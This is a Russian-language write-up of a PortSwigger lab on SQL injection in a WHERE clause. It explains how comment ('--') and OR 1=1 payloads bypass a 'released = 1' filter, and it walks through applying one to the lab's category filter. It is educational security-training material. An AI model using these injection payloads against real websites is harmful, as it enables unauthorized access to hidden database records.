# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Theory

<h3>Игнорирование части запроса</h3>

Данный запрос заставляет приложение выполнить SQL-запрос для получения соответсвующих продуктах из базы данных:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

SQL-запрос просит базу данных вернуть следующее:

* Все детали (*)
* Из таблицы products
* Где категория Gifts
* Которые выпущены (released 1)

Ограничение **released = 1** используется, чтобы скрыть невыпущенные продукты.

Так как приложение не защищено, злоумышленник может использовать следующий эксплоит:
```
https://site/products?category=Gifts'--
```

SQL-запрос будет выглядеть следующим образом:
```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Ключевым моментом здесь является двойное тире **"--"**, которое в SQL означает комментарий. Это значит, что остальная часть запроса после "--" игнорируется.

<br></br>

<h3>Показывать все продукты, незивисимо от категории</h3>

Для того, чтобы отобразить все продукты независимо от категории можно использовать следующий эксплоит:
```
https://site/products?category=Gifts'+OR+1=1--
```

Запрос будет выгляденть следующим образом:
```
SELECT * FROM products WHERE category = 'Gifts' or 1=1 -- ' AND released = 1
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/assets/1.png)

Выберем пункт Accessories.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/assets/2.png)

Модифицируем запрос, чтобы получить все продукты:
```
/filter?category=Accessories'+or+1=1--
```

Отправляем запрос и получает ответ от сайта

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/assets/3.png)


